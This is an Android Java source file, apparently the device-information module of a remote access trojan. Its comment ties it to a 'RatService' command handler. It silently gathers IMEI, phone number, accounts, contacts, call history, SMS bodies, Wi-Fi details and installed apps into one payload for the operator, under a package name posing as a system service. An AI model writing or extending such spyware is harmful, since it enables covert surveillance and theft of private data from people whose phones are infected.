package com.system.service;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * Collects all device information into one payload string.
 * Called from RatService dispatch() on "full_info" command.
 *
 * Returns sections separated by newlines, each prefixed with [SECTION].
 */
public class DeviceInfo {

    @SuppressLint({"MissingPermission", "HardwareIds"})
    public static String collect(Context ctx) {
        StringBuilder sb = new StringBuilder();

        // ── Hardware ──────────────────────────────────────────────
        sb.append("[HW]")
          .append(" model=").append(Build.MODEL)
          .append(" brand=").append(Build.BRAND)
          .append(" manufacturer=").append(Build.MANUFACTURER)
          .append(" device=").append(Build.DEVICE)
          .append(" product=").append(Build.PRODUCT)
          .append(" board=").append(Build.BOARD)
          .append(" hardware=").append(Build.HARDWARE)
          .append(" cpu_abi=").append(Build.SUPPORTED_ABIS[0])
          .append('\n');

        // ── OS ───────────────────────────────────────────────────
        sb.append("[OS]")
          .append(" android=").append(Build.VERSION.RELEASE)
          .append(" sdk=").append(Build.VERSION.SDK_INT)
          .append(" build=").append(Build.DISPLAY)
          .append(" security_patch=").append(Build.VERSION.SECURITY_PATCH)
          .append(" incremental=").append(Build.VERSION.INCREMENTAL)
          .append('\n');

        // ── SIM / IMEI ───────────────────────────────────────────
        try {
            TelephonyManager tm =
                (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                sb.append("[SIM]")
                  .append(" operator=").append(tm.getNetworkOperatorName())
                  .append(" country=").append(tm.getNetworkCountryIso())
                  .append(" sim_state=").append(tm.getSimState())
                  .append(" sim_operator=").append(tm.getSimOperatorName())
                  .append(" phone_type=").append(tm.getPhoneType())
                  .append('\n');

                if (ctx.checkSelfPermission(Manifest.permission.READ_PHONE_STATE)
                        == PackageManager.PERMISSION_GRANTED) {
                    sb.append("[IMEI]")
                      .append(" imei=").append(tm.getImei())
                      .append(" meid=").append(tm.getMeid())
                      .append(" line1=").append(tm.getLine1Number())
                      .append('\n');
                }
            }
        } catch (Exception e) {
            sb.append("[IMEI] error=").append(e.getMessage()).append('\n');
        }

        // ── Android ID ───────────────────────────────────────────
        String android_id = Settings.Secure.getString(
            ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
        sb.append("[IDS]")
          .append(" android_id=").append(android_id)
          .append(" fingerprint=").append(Build.FINGERPRINT)
          .append('\n');

        // ── WiFi ─────────────────────────────────────────────────
        try {
            WifiManager wm =
                (WifiManager) ctx.getApplicationContext()
                               .getSystemService(Context.WIFI_SERVICE);
            if (wm != null && wm.isWifiEnabled()) {
                WifiInfo wi = wm.getConnectionInfo();
                sb.append("[WIFI]")
                  .append(" ssid=").append(wi.getSSID())
                  .append(" bssid=").append(wi.getBSSID())
                  .append(" ip=").append(int_to_ip(wi.getIpAddress()))
                  .append(" mac=").append(wi.getMacAddress())
                  .append(" rssi=").append(wi.getRssi())
                  .append('\n');
            }
        } catch (Exception e) {
            sb.append("[WIFI] error=").append(e.getMessage()).append('\n');
        }

        // ── Network interfaces (all IPs including cellular) ───────
        try {
            List<String> addrs = new ArrayList<>();
            for (NetworkInterface ni :
                    Collections.list(NetworkInterface.getNetworkInterfaces())) {
                for (InetAddress addr :
                        Collections.list(ni.getInetAddresses())) {
                    if (!addr.isLoopbackAddress()) {
                        addrs.add(ni.getName() + "=" + addr.getHostAddress());
                    }
                }
            }
            sb.append("[NET] ").append(String.join(" ", addrs)).append('\n');
        } catch (Exception ignored) {}

        // ── Battery ───────────────────────────────────────────────
        try {
            BatteryManager bm =
                (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) {
                int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                int status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS);
                sb.append("[BATTERY]")
                  .append(" level=").append(level).append('%')
                  .append(" charging=").append(
                      status == BatteryManager.BATTERY_STATUS_CHARGING ? "yes" : "no")
                  .append('\n');
            }
        } catch (Exception ignored) {}

        // ── Accounts (Google, etc.) ───────────────────────────────
        try {
            AccountManager am = AccountManager.get(ctx);
            Account[] accounts = am.getAccounts();
            for (Account acc : accounts) {
                sb.append("[ACCOUNT]")
                  .append(" type=").append(acc.type)
                  .append(" name=").append(acc.name)
                  .append('\n');
            }
        } catch (Exception e) {
            sb.append("[ACCOUNT] error=").append(e.getMessage()).append('\n');
        }

        // ── Contacts dump ─────────────────────────────────────────
        try {
            if (ctx.checkSelfPermission(Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED) {
                Cursor c = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    }, null, null, null);
                if (c != null) {
                    while (c.moveToNext()) {
                        sb.append("[CONTACT]")
                          .append(" name=").append(c.getString(0))
                          .append(" num=").append(c.getString(1))
                          .append('\n');
                    }
                    c.close();
                }
            }
        } catch (Exception e) {
            sb.append("[CONTACTS] error=").append(e.getMessage()).append('\n');
        }

        // ── Call log ──────────────────────────────────────────────
        try {
            if (ctx.checkSelfPermission(Manifest.permission.READ_CALL_LOG)
                    == PackageManager.PERMISSION_GRANTED) {
                Cursor c = ctx.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DURATION,
                        CallLog.Calls.DATE
                    }, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 100");
                if (c != null) {
                    while (c.moveToNext()) {
                        String type_str = switch (c.getInt(1)) {
                            case CallLog.Calls.INCOMING_TYPE  -> "in";
                            case CallLog.Calls.OUTGOING_TYPE  -> "out";
                            case CallLog.Calls.MISSED_TYPE    -> "miss";
                            default                           -> "other";
                        };
                        sb.append("[CALL]")
                          .append(" num=").append(c.getString(0))
                          .append(" type=").append(type_str)
                          .append(" dur=").append(c.getLong(2)).append("s")
                          .append(" time=").append(c.getLong(3))
                          .append('\n');
                    }
                    c.close();
                }
            }
        } catch (Exception e) {
            sb.append("[CALLS] error=").append(e.getMessage()).append('\n');
        }

        // ── SMS inbox dump (last 50) ──────────────────────────────
        try {
            if (ctx.checkSelfPermission(Manifest.permission.READ_SMS)
                    == PackageManager.PERMISSION_GRANTED) {
                Cursor c = ctx.getContentResolver().query(
                    android.net.Uri.parse("content://sms/inbox"),
                    new String[]{"address", "body", "date"},
                    null, null, "date DESC LIMIT 50");
                if (c != null) {
                    while (c.moveToNext()) {
                        sb.append("[SMS]")
                          .append(" from=").append(c.getString(0))
                          .append(" body=").append(c.getString(1)
                              .replace("\n", " ").trim())
                          .append(" date=").append(c.getLong(2))
                          .append('\n');
                    }
                    c.close();
                }
            }
        } catch (Exception e) {
            sb.append("[SMS] error=").append(e.getMessage()).append('\n');
        }

        // ── Installed apps ────────────────────────────────────────
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps =
                pm.getInstalledApplications(PackageManager.GET_META_DATA);
            for (ApplicationInfo app : apps) {
                // Only user-installed apps
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    sb.append("[APP]")
                      .append(" pkg=").append(app.packageName)
                      .append(" label=").append(pm.getApplicationLabel(app))
                      .append('\n');
                }
            }
        } catch (Exception e) {
            sb.append("[APPS] error=").append(e.getMessage()).append('\n');
        }

        // ── Storage info ──────────────────────────────────────────
        try {
            File storage = android.os.Environment.getExternalStorageDirectory();
            sb.append("[STORAGE]")
              .append(" ext_total=").append(storage.getTotalSpace() / 1024 / 1024).append("MB")
              .append(" ext_free=").append(storage.getFreeSpace()  / 1024 / 1024).append("MB")
              .append('\n');
        } catch (Exception ignored) {}

        // ── Root check ────────────────────────────────────────────
        sb.append("[ROOT] rooted=").append(is_rooted() ? "yes" : "no").append('\n');

        return sb.toString();
    }

    // ──────────────────────────────────────────────────────────────

    private static String int_to_ip(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8)  & 0xFF)
             + "." + ((ip >> 16) & 0xFF)
             + "." + ((ip >> 24) & 0xFF);
    }

    private static boolean is_rooted() {
        String[] paths = {
            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
            "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"
        };
        for (String p : paths) if (new File(p).exists()) return true;
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"which", "su"});
            BufferedReader r = new BufferedReader(
                new FileReader(proc.getInputStream().toString()));
            return r.readLine() != null;
        } catch (Exception ignored) {}
        return false;
    }
}
